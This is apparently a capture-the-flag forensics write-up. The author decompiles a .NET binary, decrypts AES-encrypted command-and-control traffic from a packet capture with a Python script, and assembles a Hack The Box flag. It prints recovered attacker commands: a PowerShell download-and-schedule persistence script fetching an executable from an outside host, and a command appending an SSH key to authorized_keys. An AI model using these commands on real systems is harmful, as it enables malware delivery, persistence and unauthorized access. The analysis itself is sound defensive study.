I found a windows executable.
I opened it using dnspy, since it seems to be a .NET executable.

I found an AES key derived from text, which, once converted ints values to text, gave the string;
`Very_S3cr3t_S`. Might be a part of the flag ?

I wrote this python script to decrypt the values from Wireshark:

```python
import pyshark
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad  # Import unpad function for padding removal
import hashlib
import binascii
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os

# # Define the salt
# SALT = bytes([86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83])
# # Define the encryption key
# ENCRYPT_KEY = b"VYAemVeO3zUDTL6N62kVA"

key =  bytes.fromhex('6ba1212a949c3526831a24a04fac7ed1a0e8d52c7c20c5ee453edf21963e6427')

iv = bytes.fromhex('e5e116e034810272092895c488d34fa7')


# Function to decrypt data
def decrypt(cipher_text, key, iv):
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        print(cipher_text)
        pouet = base64.b64decode(cipher_text)
        decrypted = cipher.decrypt(pouet)
        print(decrypted)
        return decrypted.decode()
    except ValueError:
        print("Pouet")

# Function to process packets
def process_packets(pcap_file):
    packets = pyshark.FileCapture(pcap_file, display_filter=f'tcp.port==1234 && ip.addr==10.10.10.21')

    with open("my_file.txt", "w") as binary_file:
        # Write bytes to file
        for packet in packets:
            if hasattr(packet, 'tcp') and 'payload' in packet.tcp.field_names and packet.tcp.payload:
                encrypted_data = packet.tcp.payload.replace(':', '')  # Remove Wireshark's display format

                if packet.ip.src == "10.10.10.22":
                    #encrypted_data = encrypted_data[2:]
                    decrypted_data = decrypt(bytearray.fromhex(encrypted_data), key, iv)
                    if decrypted_data is not None:
                        binary_file.write(decrypted_data)
                    print("Decrypted data:", decrypted_data)


# Call the function with the path to your Wireshark capture file
process_packets('your_capture.pcap')
```

I got some strings, including the flag part:
`_h45_b33n_r357`


I also found this Base64 text:
`CgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwAHMAOgAvAC8AdwBpAG4AZABvAHcAcwBsAGkAdgBlAHUAcABkAGEAdABlAHIALgBjAG8AbQAvADQAZgB2AGEALgBlAHgAZQAiACwAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIAKQAKAAoAJABhAGMAdABpAG8AbgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAQQBjAHQAaQBvAG4AIAAtAEUAeABlAGMAdQB0AGUAIAAiAEMAOgBcAFUAcwBlAHIAcwBcAHMAdgBjADAAMQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwANABmAHYAYQAuAGUAeABlACIACgAKACQAdAByAGkAZwBnAGUAcgAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0ARABhAGkAbAB5ACAALQBBAHQAIAAyADoAMAAwAEEATQAKAAoAJABzAGUAdAB0AGkAbgBnAHMAIAA9ACAATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFMAZQB0AHQAaQBuAGcAcwBTAGUAdAAKAAoAIwAgADMAdABoACAAZgBsAGEAZwAgAHAAYQByAHQAOgAKAAoAUgBlAGcAaQBzAHQAZQByAC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawAgAC0AVABhAHMAawBOAGEAbQBlACAAIgAwAHIAMwBkAF8AMQBuAF8ANwBoADMAXwBoADMANABkAHEAdQA0AHIANwAzAHIANQB9ACIAIAAtAEEAYwB0AGkAbwBuACAAJABhAGMAdABpAG8AbgAgAC0AVAByAGkAZwBnAGUAcgAgACQAdAByAGkAZwBnAGUAcgAgAC0AUwBlAHQAdABpAG4AZwBzACAAJABzAGUAdAB0AGkAbgBnAHMACgA=`

After decoding B64, we get this:

```
(New-Object System.Net.WebClient).DownloadFile("https://windowsliveupdater.com/4fva.exe", "C:\Users\svc01\AppData\Roaming\4fva.exe")

$action = New-ScheduledTaskAction -Execute "C:\Users\svc01\AppData\Roaming\4fva.exe"

$trigger = New-ScheduledTaskTrigger -Daily -At 2:00AM

$settings = New-ScheduledTaskSettingsSet

# 3th flag part:

Register-ScheduledTask -TaskName "0r3d_1n_7h3_h34dqu4r73r5}" -Action $action -Trigger $trigger -Settings $settings

```

So currently out flag should be...
```
_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}
```

I updated my script after understanding how server was sending messages.
```python
import pyshark
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad  # Import unpad function for padding removal
import hashlib
import binascii
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os

# # Define the salt
# SALT = bytes([86, 101, 114, 121, 95, 83, 51, 99, 114, 51, 116, 95, 83])
# # Define the encryption key
# ENCRYPT_KEY = b"VYAemVeO3zUDTL6N62kVA"

key =  bytes.fromhex('6ba1212a949c3526831a24a04fac7ed1a0e8d52c7c20c5ee453edf21963e6427')

iv = bytes.fromhex('e5e116e034810272092895c488d34fa7')


# Function to decrypt data
def decrypt(cipher_text, key, iv):
    ret = "CONNARD"
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        if b'\xa7' in cipher_text:
            print("stripped:", cipher_text.split(b'\xa7')[-1])
            cipher_text = cipher_text.split(b'\xa7')[-1]
        
        print("before decode:", cipher_text)
        pouet = base64.b64decode(cipher_text)
        print(pouet, len(pouet))

        decrypted = cipher.decrypt(pouet)
        print("OK")
        ret = decrypted.decode()
    except:
        pass

    return ret
        

# Function to process packets
def process_packets(pcap_file):
    packets = pyshark.FileCapture(pcap_file, display_filter=f'tcp.port==1234 && ip.addr==10.10.10.21')

    with open("my_file.txt", "w") as binary_file:
        # Write bytes to file
        for packet in packets:
            if hasattr(packet, 'tcp') and 'payload' in packet.tcp.field_names and packet.tcp.payload:
                encrypted_data = packet.tcp.payload.replace(':', '')  # Remove Wireshark's display format
                decrypted_data = decrypt(bytearray.fromhex(encrypted_data), key, iv)
                if decrypted_data is not None:
                    binary_file.write(decrypted_data)


# Call the function with the path to your Wireshark capture file
process_packets('your_capture.pcap')

```

I had to take elements after `\xa7` because the server was adding the message size before that.

That gives us another message, which contains the first flag part ! :)

```
cmd;C:\;echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwyPZCQyJ/s45lt+cRqPhJj5qrSqd8cvhUaDhwsAemRey2r7Ta+wLtkWZobVIFS4HGzRobAw9s3hmFaCKI8GvfgMsxDSmb0bZcAAkl7cMzhA1F418CLlghANAPFM6Aud7DlJZUtJnN2BiTqbrjPmBuTKeBxjtI0uRTXt4JvpDKx9aCMNEDKGcKVz0KX/hejjR/Xy0nJxHWKgudEz3je31cVow6kKqp3ZUxzZz9BQlxU5kRp4yhUUxo3Fbomo6IsmBydqQdB+LbHGURUFLYWlWEy+1otr6JBwpAfzwZOYVEfLypl3Sjg+S6Fd1cH6jBJp/mG2R2zqCKt3jaWH5SJz13 HTB{c0mmun1c4710n5 >> C:\Users\svc01\.ssh\authorized_keys
```


Which gives us our final flag ! 
```
HTB{c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}
```


